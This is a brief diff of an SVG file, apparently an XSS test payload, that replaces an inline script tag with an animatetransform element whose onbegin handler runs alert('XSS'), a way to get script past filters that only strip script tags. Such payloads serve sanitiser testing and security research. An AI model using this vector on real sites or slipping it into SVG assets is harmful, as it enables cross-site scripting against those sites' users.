@@ -1,6 +1,4 @@
-<!-- xss.svg -->
 <svg xmlns="http://www.w3.org/2000/svg">
-  <script>
-    alert(document.domain)
-  </script>
+  <animatetransform attributeName="transform" begin="0s" dur="1s" type="rotate" from="0 50 50" to="360 50 50" onbegin="alert('XSS')" />
 </svg>
+
